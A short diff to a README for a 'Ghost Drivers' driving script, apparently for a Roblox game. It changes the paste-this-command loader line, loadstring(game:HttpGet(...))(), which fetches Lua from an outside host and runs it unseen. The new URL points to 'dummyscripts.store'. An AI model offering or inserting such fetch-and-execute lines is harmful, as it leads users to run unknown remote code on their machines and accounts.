@@ -11,7 +11,7 @@ A Ghost Drivers driving script for **Valhalla GT** and **Wulfbrecht RZ7**, with 
 ## Copy the script
 
 ```lua
-loadstring(game:HttpGet("https://ghost-drivers-demo.ghost-drivers-private-host.workers.dev/loader.lua"))()
+loadstring(game:HttpGet("https://dummyscripts.store/loader.lua"))()
 ```
 
 ## Start driving
